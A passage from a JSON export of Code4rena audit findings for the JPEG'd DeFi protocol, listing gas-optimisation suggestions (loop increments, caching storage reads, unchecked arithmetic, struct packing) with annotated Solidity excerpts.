      "content": "\n`++i` costs less gas compared to `i++` or `i += 1` for unsigned integer, as pre-increment is cheaper (about 5 gas per iteration). This statement is true even with the optimizer enabled.\n\n`i++` increments `i` and returns the initial value of `i`. Which means:\n\n```solidity\nuint i = 1;  \ni++; // == 1 but i == 2  \n```\n\nBut `++i` returns the actual incremented value:\n\n```solidity\nuint i = 1;  \n++i; // == 2 and i == 2 too, so no need for a temporary variable  \n```\n\nIn the first case, the compiler has to create a temporary variable (when used) for returning `1` instead of `2`\n\nInstances include:\n\n```solidity\nfarming/LPFarming.sol:348:        for (uint256 i = 0; i < poolInfo.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:145:        for (uint256 i = 0; i < _strategyConfig.rewardTokens.length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:231:        for (uint256 i = 0; i < length; i++) {\nvaults/yVault/strategies/StrategyPUSDConvex.sol:319:            for (uint256 i = 0; i < rewardTokens.length; i++) {\nvaults/NFTVault.sol:181:        for (uint256 i = 0; i < _typeInitializers.length; i++) {\nvaults/NFTVault.sol:184:            for (uint256 j = 0; j < initializer.nfts.length; j++) {\n```\n\nI suggest using `++i` instead of `i++` to increment the value of an uint variable.\n\nThis is already done here:\n\n```solidity\nfarming/LPFarming.sol:281:        for (uint256 pid = 0; pid < length; ++pid) {\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-37-i-costs-less-gas-compared-to-i-or-i--1",
      "tags": [],
      "finders": []
    },
    {
      "id": "5343",
      "title": "[G-35] `>=` is cheaper than `>`",
      "impact": "GAS",
      "content": "\nStrict inequalities (`>`) are more expensive than non-strict ones (`>=`). This is due to some supplementary checks (ISZERO, 3 gas)\n\nI suggest using  `>=`  instead of `>` to avoid some opcodes here:\n\n```solidity\nvaults/NFTVault.sol:539:        return principal > calculatedDebt ? principal : calculatedDebt;\nvaults/NFTVault.sol:775:        _amount = _amount > debtAmount ? debtAmount : _amount;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-35--is-cheaper-than-",
      "tags": [],
      "finders": []
    },
    {
      "id": "5342",
      "title": "[G-34] `> 0` is less efficient than `!= 0` for unsigned integers (with proof)",
      "impact": "GAS",
      "content": "\n`!= 0` costs less gas compared to `> 0` for unsigned integers in `require` statements with the optimizer enabled (6 gas)\n\nProof: While it may seem that `> 0` is cheaper than `!=`, this is only true without the optimizer enabled and outside a require statement. If you enable the optimizer at 10k AND you're in a `require` statement, this will save gas. You can see this tweet for more proofs: <https://twitter.com/gzeon/status/1485428085885640706>\n\nI suggest changing `> 0` with `!= 0` here:\n\n```solidity\nfarming/LPFarming.sol:114:        require(_rewardPerBlock > 0, \"Invalid reward per block\");\nfarming/LPFarming.sol:218:        require(_amount > 0, \"invalid_amount\");\nfarming/LPFarming.sol:239:        require(_amount > 0, \"invalid_amount\");\nfarming/LPFarming.sol:337:        require(rewards > 0, \"no_reward\");\nfarming/LPFarming.sol:354:        require(rewards > 0, \"no_reward\");\nfarming/yVaultLPFarming.sol:101:        require(_amount > 0, \"invalid_amount\");\nfarming/yVaultLPFarming.sol:118:        require(_amount > 0, \"invalid_amount\");\nfarming/yVaultLPFarming.sol:139:        require(rewards > 0, \"no_reward\");\nlock/JPEGLock.sol:40:        require(_newTime > 0, \"Invalid lock time\");\nstaking/JPEGStaking.sol:32:        require(_amount > 0, \"invalid_amount\");\nvaults/yVault/strategies/StrategyPUSDConvex.sol:182:            _performanceFee.denominator > 0 &&\nvaults/yVault/strategies/StrategyPUSDConvex.sol:334:            require(wethBalance > 0, \"NOOP\");\nvaults/yVault/yVault.sol:100:            _rate.numerator > 0 && _rate.denominator >= _rate.numerator,\nvaults/yVault/yVault.sol:143:        require(_amount > 0, \"INVALID_AMOUNT\");\nvaults/yVault/yVault.sol:167:        require(_shares > 0, \"INVALID_AMOUNT\");\nvaults/yVault/yVault.sol:170:        require(supply > 0, \"NO_TOKENS_DEPOSITED\");\nvaults/FungibleAssetVaultForDAO.sol:94:            _creditLimitRate.denominator > 0 &&\nvaults/FungibleAssetVaultForDAO.sol:108:        require(answer > 0, \"invalid_oracle_answer\");\nvaults/FungibleAssetVaultForDAO.sol:142:        require(amount > 0, \"invalid_amount\");\nvaults/FungibleAssetVaultForDAO.sol:164:        require(amount > 0, \"invalid_amount\");\nvaults/FungibleAssetVaultForDAO.sol:180:        require(amount > 0, \"invalid_amount\");\nvaults/FungibleAssetVaultForDAO.sol:194:        require(amount > 0 && amount <= collateralAmount, \"invalid_amount\");\nvaults/NFTVault.sol:278:        require(_newFloor > 0, \"Invalid floor\");\nvaults/NFTVault.sol:327:            _type == bytes32(0) || nftTypeValueETH[_type] > 0,\nvaults/NFTVault.sol:365:        require(pendingValue > 0, \"no_pending_value\");\nvaults/NFTVault.sol:402:            rate.denominator > 0 && rate.denominator >= rate.numerator,\nvaults/NFTVault.sol:462:        require(answer > 0, \"invalid_oracle_answer\");\nvaults/NFTVault.sol:687:        require(_amount > 0, \"invalid_amount\");\nvaults/NFTVault.sol:764:        require(_amount > 0, \"invalid_amount\");\nvaults/NFTVault.sol:770:        require(debtAmount > 0, \"position_not_borrowed\");\nvaults/NFTVault.sol:882:        require(position.liquidatedAt > 0, \"not_liquidated\");\nvaults/NFTVault.sol:926:        require(position.liquidatedAt > 0, \"not_liquidated\");\n```\n\nAlso, please enable the Optimizer.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-34--0-is-less-efficient-than--0-for-unsigned-integers-with-proof",
      "tags": [],
      "finders": []
    },
    {
      "id": "5341",
      "title": "[G-31] `yVault.withdrawJPEG()`: `farm` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n187:     function withdrawJPEG() external {\n188:         require(farm != address(0), \"NO_FARM\");  //@audit gas: SLOAD 1 farm\n189:         controller.withdrawJPEG(address(token), farm);  //@audit gas: SLOAD 2 farm\n190:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-31-yvaultwithdrawjpeg-farm-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5340",
      "title": "[G-30] `yVault.withdraw()`: `token` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n166:     function withdraw(uint256 _shares) public noContract(msg.sender) {\n...\n176:         uint256 vaultBalance = token.balanceOf(address(this)); //@audit gas: SLOAD 1 token\n177:         if (vaultBalance < backingTokens) {\n178:             uint256 toWithdraw = backingTokens - vaultBalance;\n179:             controller.withdraw(address(token), toWithdraw);  //@audit gas: SLOAD 2 token\n180:         }\n181: \n182:         token.safeTransfer(msg.sender, backingTokens);  //@audit gas: SLOAD 3 token\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-30-yvaultwithdraw-token-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5339",
      "title": "[G-29] `yVault.withdraw()`: L178 should be unchecked due to L177",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n166:     function withdraw(uint256 _shares) public noContract(msg.sender) {\n...\n177:         if (vaultBalance < backingTokens) {\n178:             uint256 toWithdraw = backingTokens - vaultBalance; //@audit gas: should be unchecked (can't underflow due to L177)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-29-yvaultwithdraw-l178-should-be-unchecked-due-to-l177",
      "tags": [],
      "finders": []
    },
    {
      "id": "5338",
      "title": "[G-28] `yVault.earn()`: `token` and `controller` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n129:     function earn() external {\n130:         uint256 _bal = available();\n131:         token.safeTransfer(address(controller), _bal); //@audit gas: SLOADs 1 token & controller\n132:         controller.earn(address(token), _bal); //@audit gas: SLOADs 2 token & controller\n133:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-28-yvaultearn-token-and-controller-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5337",
      "title": "[G-27] `StrategyPUSDConvex.harvest()`: L362 should be unchecked due to L359-L360 and how performanceFee is set L183",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n177:     function setPerformanceFee(Rate memory _performanceFee)\n...\n181:         require(\n182:             _performanceFee.denominator > 0 &&\n183:                 _performanceFee.denominator >= _performanceFee.numerator, //@audit gas: can uncheck L362 thanks to this\n184:             \"INVALID_RATE\"\n185:         );\n...\n311:     function harvest(uint256 minOutCurve) external onlyRole(STRATEGIST_ROLE) {\n...\n359:         uint256 fee = (usdcBalance * performanceFee.numerator) /\n360:             performanceFee.denominator;\n361:         usdc.safeTransfer(strategy.controller.feeAddress(), fee);\n362:         usdcBalance -= fee; //@audit gas: should be unchecked (can't underflow due to L359-L360 & how performanceFee is set L183)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-27-strategypusdconvexharvest-l362-should-be-unchecked-due-to-l359-l360-and-how-performancefee-is-set-l183",
      "tags": [],
      "finders": []
    },
    {
      "id": "5336",
      "title": "[G-26] `StrategyPUSDConvex.withdraw()`: L281 should be unchecked due to L279",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n273:     function withdraw(uint256 _amount) external onlyController {\n...\n279:         if (balance < _amount)\n280:             convexConfig.baseRewardPool.withdrawAndUnwrap(\n281:                 _amount - balance, //@audit gas: should be unchecked (can't underflow due to L279)\n282:                 false\n283:             );\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-26-strategypusdconvexwithdraw-l281-should-be-unchecked-due-to-l279",
      "tags": [],
      "finders": []
    },
    {
      "id": "5335",
      "title": "[G-25] `StrategyPUSDConvex.balanceOfJPEG()`: use a `return` statement instead of `break`",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n226:     function balanceOfJPEG() external view returns (uint256) {\n...\n231:         for (uint256 i = 0; i < length; i++) {\n...\n233:             if (address(jpeg) == extraReward.rewardToken()) {\n234:                 availableBalance += extraReward.earned();\n235:                 //we found jpeg, no need to continue the loop\n236:                 break; //@audit gas: instead of adding to availableBalance & breaking, just return here \"availableBalance + extraReward.earned()\"\n237:             }\n238:         }\n239: \n240:         return availableBalance;\n241:     }\n```\n\nHere, instead of making a memory operation with `availableBalance += extraReward.earned();` and then using `break;` before returning the memory variable `availableBalance`, it would've been more optimized to just return `availableBalance + extraReward.earned()`:\n\n```solidity\n    function balanceOfJPEG() external view returns (uint256) {\n...\n        for (uint256 i = 0; i < length; i++) {\n...\n            if (address(jpeg) == extraReward.rewardToken()) {\n              return availableBalance + extraReward.earned();\n            }\n        }\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-25-strategypusdconvexbalanceofjpeg-use-a-return-statement-instead-of-break",
      "tags": [],
      "finders": []
    },
    {
      "id": "5334",
      "title": "[G-24] `StrategyPUSDConvex.balanceOfJPEG()`: `jpeg` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n226:     function balanceOfJPEG() external view returns (uint256) {\n227:         uint256 availableBalance = jpeg.balanceOf(address(this)); //@audit gas: SLOAD 1 jpeg\n...\n231:         for (uint256 i = 0; i < length; i++) {\n...\n233:             if (address(jpeg) == extraReward.rewardToken()) { //@audit gas: SLOADs in Loop for jpeg. Cache it at L227\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-24-strategypusdconvexbalanceofjpeg-jpeg-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5333",
      "title": "[G-23] `Controller.setStrategy()`: boolean comparison L87",
      "impact": "GAS",
      "content": "\nComparing to a constant (`true` or `false`) is a bit more expensive than directly checking the returned boolean value.\nI suggest using `if(directValue)` instead of `if(directValue == true)` and `if(!directValue)` instead of `if(directValue == false)` here (see `@audit` tag):\n\n```solidity\n82:     function setStrategy(IERC20 _token, IStrategy _strategy)\n83:         external\n84:         onlyRole(STRATEGIST_ROLE)\n85:     {\n86:         require(\n87:             approvedStrategies[_token][_strategy] == true, //@audit gas: instead of comparing to a constant, just use \"approvedStrategies[_token][_strategy]\"\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-23-controllersetstrategy-boolean-comparison-l87",
      "tags": [],
      "finders": []
    },
    {
      "id": "5332",
      "title": "[G-22] `NFTVault.repay()`: `totalDebtPortion` and `totalDebtAmount` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n756:     function repay(uint256 _nftIndex, uint256 _amount)\n...\n784:         uint256 minusPortion = paidPrincipal == debtPrincipal\n785:             ? position.debtPortion\n786:             : (totalDebtPortion * _amount) / totalDebtAmount; //@audit gas: SLOADs 1 totalDebtPortion & totalDebtAmount\n787: \n788:         totalDebtPortion -= minusPortion; //@audit gas: SLOAD 2 totalDebtPortion (could've used cached value for calculation)\n...\n791:         totalDebtAmount -= _amount; //@audit gas: SLOAD 2 totalDebtAmount (could've used cached value for calculation)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-22-nftvaultrepay-totaldebtportion-and-totaldebtamount-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5331",
      "title": "[G-21] `NFTVault.repay()`: L781 should be unchecked due to ternary operator",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n756:     function repay(uint256 _nftIndex, uint256 _amount)\n...\n780:         uint256 paidPrincipal = _amount > debtInterest\n781:             ? _amount - debtInterest //@audit gas: should be unchecked (obviously)\n782:             : 0;\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-21-nftvaultrepay-l781-should-be-unchecked-due-to-ternary-operator",
      "tags": [],
      "finders": []
    },
    {
      "id": "5330",
      "title": "[G-20] `NFTVault.borrow()`: `totalDebtPortion` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n675:     function borrow(\n...\n735:         if (totalDebtPortion == 0) {  //@audit gas: SLOAD 1 totalDebtPortion\n...\n738:         } else {\n739:             uint256 plusPortion = (totalDebtPortion * _amount) / //@audit gas: SLOAD 2 totalDebtPortion\n740:                 totalDebtAmount;\n741:             totalDebtPortion += plusPortion; //@audit gas: SLOAD 3 totalDebtPortion (could've used cached value for calculation)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-20-nftvaultborrow-totaldebtportion-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5329",
      "title": "[G-19] `NFTVault.showPosition()`: Help the optimizer by saving a storage variable's reference instead of repeatedly fetching it (`positions[_nftIndex]`)",
      "impact": "GAS",
      "content": "\nTo help the optimizer, declare a `storage` type variable and use it instead of repeatedly fetching the reference in a map or an array.\n\nThe effect can be quite significant.\n\nHere, instead of repeatedly calling `positions[_nftIndex]`, save its reference like this: `Position storage _position = positions[_nftIndex]` and use it.\n\nImpacted lines (see `@audit` tags):\n\n```solidity\n  636:         uint256 debtPrincipal = positions[_nftIndex].debtPrincipal; //@audit gas: use the suggested storage variable \"Position storage _position\"\n  637:         uint256 debtAmount = positions[_nftIndex].liquidatedAt > 0 //@audit gas: use the suggested storage variable \"Position storage _position\"\n  638:             ? positions[_nftIndex].debtAmountForRepurchase //@audit gas: use the suggested storage variable \"Position storage _position\"\n  641:                 positions[_nftIndex].debtPortion, //@audit gas: use the suggested storage variable \"Position storage _position\"\n  660:             borrowType: positions[_nftIndex].borrowType, //@audit gas: use the suggested storage variable \"Position storage _position\"\n  661:             liquidatable: positions[_nftIndex].liquidatedAt == 0 && //@audit gas: use the suggested storage variable \"Position storage _position\"\n  663:             liquidatedAt: positions[_nftIndex].liquidatedAt, //@audit gas: use the suggested storage variable \"Position storage _position\"\n  664:             liquidator: positions[_nftIndex].liquidator //@audit gas: use the suggested storage variable \"Position storage _position\"\n```\n\nThis practice already exists in the solution, as seen in `NFTVault.borrow()`:\n\n```solidity\n675:     function borrow(\n...\n697:         Position storage position = positions[_nftIndex];\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-19-nftvaultshowposition-help-the-optimizer-by-saving-a-storage-variables-reference-instead-of-repeatedly-fetching-it-positions_nftindex",
      "tags": [],
      "finders": []
    },
    {
      "id": "5328",
      "title": "[G-18] `NFTVault.showPosition()`: `positions[_nftIndex].liquidatedAt` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\nFile: NFTVault.sol\n628:     function showPosition(uint256 _nftIndex)\n...\n661:             liquidatable: positions[_nftIndex].liquidatedAt == 0 &&  //@audit gas: SLOAD 1 positions[_nftIndex].liquidatedAt\n662:                 debtAmount >= _getLiquidationLimit(_nftIndex),\n663:             liquidatedAt: positions[_nftIndex].liquidatedAt,  //@audit gas: SLOAD 2 positions[_nftIndex].liquidatedAt\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-18-nftvaultshowposition-positions_nftindexliquidatedat-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5327",
      "title": "[G-17] `NFTVault.showPosition()`: L659 should be unchecked due to L649",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\nFile: NFTVault.sol\n628:     function showPosition(uint256 _nftIndex)\n...\n649:         if (debtPrincipal > debtAmount) debtAmount = debtPrincipal;\n...\n659:             debtInterest: debtAmount - debtPrincipal, //@audit gas: should be unchecked (can't underflow due to L649)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-17-nftvaultshowposition-l659-should-be-unchecked-due-to-l649",
      "tags": [],
      "finders": []
    },
    {
      "id": "5326",
      "title": "[G-16] `NFTVault.sol`: `struct PositionPreview` can be tightly packed to save 1 storage slot",
      "impact": "GAS",
      "content": "\nFrom (see `@audit` tags):\n\n```solidity\n610:     struct PositionPreview { // @audit gas: can be tightly packed by moving borrowType and liquidatable at the end\n611:         address owner;\n612:         uint256 nftIndex;\n613:         bytes32 nftType;\n614:         uint256 nftValueUSD;\n615:         VaultSettings vaultSettings;\n616:         uint256 creditLimit;\n617:         uint256 debtPrincipal;\n618:         uint256 debtInterest; // @audit gas: 32 bytes\n619:         BorrowType borrowType; // @audit gas: 1 byte (this enum is equivalent to uint8 as it has less than 256 options)\n620:         bool liquidatable; // @audit gas: 1 byte\n621:         uint256 liquidatedAt; // @audit gas: 32 bytes\n622:         address liquidator; // @audit gas: 20 bytes\n623:     }\n```\n\nTo:\n\n```solidity\n    struct PositionPreview {\n        address owner;\n        uint256 nftIndex;\n        bytes32 nftType;\n        uint256 nftValueUSD;\n        VaultSettings vaultSettings;\n        uint256 creditLimit;\n        uint256 debtPrincipal;\n        uint256 debtInterest; // @audit gas: 32 bytes\n        uint256 liquidatedAt; // @audit gas: 32 bytes\n        BorrowType borrowType; // @audit gas: 1 byte (this enum is equivalent to uint8 as it has less than 256 options)\n        bool liquidatable; // @audit gas: 1 byte\n        address liquidator; // @audit gas: 20 bytes\n    }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-16-nftvaultsol-struct-positionpreview-can-be-tightly-packed-to-save-1-storage-slot",
      "tags": [],
      "finders": []
    },
    {
      "id": "5325",
      "title": "[G-15] `NFTVault._calculateAdditionalInterest()`: `totalDebtAmount` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n578:     function _calculateAdditionalInterest() internal view returns (uint256) {\n...\n585:         if (totalDebtAmount == 0) {  //@audit gas: SLOAD 1 totalDebtAmount\n586:             return 0;\n587:         }\n588: \n589:         // Accrue interest\n590:         uint256 interestPerYear = (totalDebtAmount *  //@audit gas: SLOAD 2 totalDebtAmount\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-15-nftvault_calculateadditionalinterest-totaldebtamount-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5324",
      "title": "[G-14] `NFTVault._normalizeAggregatorAnswer()`: return statement should be unchecked",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n454:     function _normalizeAggregatorAnswer(IAggregatorV3Interface aggregator)\n455:         internal\n456:         view\n457:         returns (uint256)\n458:     {\n...\n464:         return //@audit gas: whole return statement should be unchecked (obviously can't underflow/overflow)\n465:             decimals > 18\n466:                 ? uint256(answer) / 10**(decimals - 18)\n467:                 : uint256(answer) * 10**(18 - decimals);\n468:     }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-14-nftvault_normalizeaggregatoranswer-return-statement-should-be-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "5323",
      "title": "[G-13] `FungibleAssetVaultForDAO.withdraw()`: `collateralAmount` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n193:     function withdraw(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n194:         require(amount > 0 && amount <= collateralAmount, \"invalid_amount\");  //@audit gas: SLOAD 1 collateralAmount\n195: \n196:         uint256 creditLimit = getCreditLimit(collateralAmount - amount); //@audit gas: SLOAD 2 collateralAmount\n197:         require(creditLimit >= debtAmount, \"insufficient_credit\");\n198: \n199:         collateralAmount -= amount; //@audit gas: SLOAD 3 collateralAmount (could've used the a cached value for calculation)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-13-fungibleassetvaultfordaowithdraw-collateralamount-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5322",
      "title": "[G-12] `FungibleAssetVaultForDAO.withdraw()`: L196 should be unchecked due to L194",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n193:     function withdraw(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n194:         require(amount > 0 && amount <= collateralAmount, \"invalid_amount\");\n195: \n196:         uint256 creditLimit = getCreditLimit(collateralAmount - amount); //@audit gas: should be unchecked (can't underflow due to L194)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-12-fungibleassetvaultfordaowithdraw-l196-should-be-unchecked-due-to-l194",
      "tags": [],
      "finders": []
    },
    {
      "id": "5321",
      "title": "[G-11] `FungibleAssetVaultForDAO.repay)`: L184 should be unchecked due to L182",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n179:     function repay(uint256 amount) external onlyRole(WHITELISTED_ROLE) nonReentrant {\n180:         require(amount > 0, \"invalid_amount\");\n181: \n182:         amount = amount > debtAmount ? debtAmount : amount;\n183: \n184:         debtAmount -= amount; //@audit gas: should be unchecked (can't underflow due to L182)\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-11-fungibleassetvaultfordaorepay-l184-should-be-unchecked-due-to-l182",
      "tags": [],
      "finders": []
    },
    {
      "id": "5320",
      "title": "[G-10] `FungibleAssetVaultForDAO.deposit()`: `collateralAsset` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n141:     function deposit(uint256 amount) external payable onlyRole(WHITELISTED_ROLE) {\n142:         require(amount > 0, \"invalid_amount\");\n143: \n144:         if (collateralAsset == ETH) {  //@audit gas: SLOAD 1 collateralAsset\n145:             require(msg.value == amount, \"invalid_msg_value\");\n146:         } else {\n147:             require(msg.value == 0, \"non_zero_eth_value\");\n148:             IERC20Upgradeable(collateralAsset).safeTransferFrom(  //@audit gas: SLOAD 2 collateralAsset\n149:                 msg.sender,\n150:                 address(this),\n151:                 amount\n152:             );\n153:         }\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-10-fungibleassetvaultfordaodeposit-collateralasset-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5319",
      "title": "[G-09] `FungibleAssetVaultForDAO._collateralPriceUsd()`: return statement should be unchecked",
      "impact": "GAS",
      "content": "\nSee `@audit` tag:\n\n```solidity\n104:     function _collateralPriceUsd() internal view returns (uint256) {\n...\n111:         return //@audit gas: whole return statement should be unchecked (obviously can't underflow/overflow here)\n112:             decimals > 18\n113:                 ? uint256(answer) / 10**(decimals - 18)  \n114:                 : uint256(answer) * 10**(18 - decimals);  \n115:     }\n```\n\nDue to the ternary condition and the fact that `int256 answer = oracle.latestAnswer();`, the return statement can't underflow and should be unchecked.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-09-fungibleassetvaultfordao_collateralpriceusd-return-statement-should-be-unchecked",
      "tags": [],
      "finders": []
    },
    {
      "id": "5318",
      "title": "[G-08] `FungibleAssetVaultForDAO._collateralPriceUsd()`: `oracle` should get cached",
      "impact": "GAS",
      "content": "\nSee `@audit` tags:\n\n```solidity\n104:     function _collateralPriceUsd() internal view returns (uint256) {\n105:         int256 answer = oracle.latestAnswer();  //@audit gas: SLOAD 1 oracle\n106:         uint8 decimals = oracle.decimals();  //@audit gas: SLOAD 2 oracle\n107: \n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "JPEG'd",
      "source_link": "https://code4rena.com/reports/2022-04-jpegd",
      "github_link": "#g-08-fungibleassetvaultfordao_collateralpriceusd-oracle-should-get-cached",
      "tags": [],
      "finders": []
    },
    {
      "id": "5317",
      "title": "[G-07] `JPEGLock.unlock()`: use `storage` instead of copying struct in memory L69",
      "impact": "GAS",
